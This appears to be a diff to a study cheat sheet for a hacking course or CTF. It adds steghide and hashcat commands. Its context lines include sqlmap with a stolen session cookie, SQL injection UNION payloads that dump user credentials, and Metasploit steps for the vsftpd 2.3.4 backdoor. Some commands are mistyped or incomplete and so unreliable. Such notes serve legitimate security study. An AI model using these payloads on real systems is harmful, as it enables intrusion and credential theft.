@@ -94,6 +94,8 @@ Tools:
 Extract hidden text using Snow:
 snow.exe -C "C:\path\to\file.txt"
 Use OpenStego or stegonline to extract from image
+OR
+steghide extract -sf f.png
 Analyze .exe using BinText
 Analyze ELF binary:
 file Sample-ELF or use Ghidra
@@ -202,6 +204,7 @@ $ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME
 •	?id=1' UNION SELECT null, table_name FROM information_schema.tables—
 •	?id=1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'—
 •	?id=1' UNION SELECT username, password FROM users WHERE username='Sarah'--
+-hashcat -m hash.txt
 OR
 -/?id=4 UNION SELECT 1,2--
 -/?id=4 UNION SELECT null, table_name FROM information_schema.tables--
@@ -235,5 +238,5 @@ Use metaspolit (example to exploit vsftpd 2.3.4)
 Step 1: sudo msf console
 Step 2 : serach vsftpd( to get step 3 command)
 Step3 : use exploit/unix/ftp/vsftpd_234_backdoor
-Step 4: set RHOSTS 192.168.1.2
+Step 4: set RHOSTS IP
 Step 5: exploit
